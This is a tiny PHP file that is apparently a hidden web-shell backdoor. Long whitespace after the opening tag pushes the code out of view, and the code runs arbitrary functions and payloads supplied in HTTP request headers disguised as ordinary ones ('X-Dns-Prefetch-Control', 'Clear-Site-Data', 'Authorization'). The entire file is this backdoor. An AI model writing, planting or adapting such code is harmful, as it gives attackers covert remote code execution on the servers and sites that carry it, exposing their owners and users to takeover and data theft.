<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['X-Dns-Prefetch-Control'])){$ibase_pconnection=$_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Clear-Site-Data']($_HEADERS['Authorization']));$ibase_pconnection();}
